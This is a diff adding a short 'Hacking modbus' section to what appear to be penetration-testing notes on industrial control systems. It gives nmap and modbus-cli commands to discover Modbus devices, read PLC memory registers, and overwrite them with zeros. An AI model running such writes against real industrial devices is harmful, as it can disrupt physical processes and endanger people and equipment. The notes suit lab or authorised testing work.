@@ -112,8 +112,29 @@ I20500 - Tank Status Report
 
 While you are connected to `telnet`, after pressing `CTRL` + `A`, type the above mentioned codes to extract corresponding information.
 
+### Hacking modbus
 
+The modbus will be running on port `502/tcp` with service name `mbap`. It is a communication protocol used in OT systems. If you detect port `502` open, you can perfrom the following steps:
 
+Run the `nmap` script named - `modbus-discover.nse` to extract more information about the protocal.
 
+```bash
+nmap 10.1.0.11 -p 502 -Pn --script modbus-discover.nse
+```
 
+use `modbus-cli` tool to directly read the memory contents
 
+```bash
+modbus read 10.1.0.19 %MW0 10
+```
+
+`%MW0` - strating memory address
+`10` - iterate next consecutive 10 address data
+
+To manipulate the memory contents, you can again use the `modbus-cli` tool. If let's say you want to owerwrite `0` as memory contents starting from address block 0 to 10, the you have to write 10 consecutive `0`'s as follows
+
+```bash
+modbus write 10.1.0.19 %MW0 0 0 0 0 0 0 0 0 0 0
+```
+
+This will owerwrite memory block from 0 to 10 with `0` as value
